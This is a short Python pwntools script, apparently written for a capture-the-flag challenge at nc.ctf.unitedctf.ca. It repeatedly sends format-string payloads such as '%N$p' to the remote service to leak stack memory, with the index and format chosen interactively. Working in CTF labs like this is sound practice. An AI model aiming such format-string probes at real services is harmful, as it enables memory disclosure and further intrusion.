from pwn import *
from time import sleep

def main():
    proc = remote("nc.ctf.unitedctf.ca", 4003)

    print(proc.recv().strip().decode())

    i = 1
    while i:
        c = "p"
        try:
            n = str(input()).strip()

            if n and not n[-1].isdigit():
                c = n[-1]
                print(f"Printing {c} format")
                n = n[:-1]
            n = int(n)

        except ValueError:
            p = i
        except KeyboardInterrupt:
            proc.close()
            exit()
        else:
            p = n
        proc.sendline(b"%"+bytes(str(p), 'utf-8')+b"$"+bytes(c,'utf-8'))
        sleep(0.05)
        rep = proc.recv().strip()
        try:
            print(rep.decode(), f"  -- p = {p}")
        except UnicodeDecodeError:
            print(rep, f"  -- p = {p}")

        i+=1

        

if __name__ == '__main__':
    main()
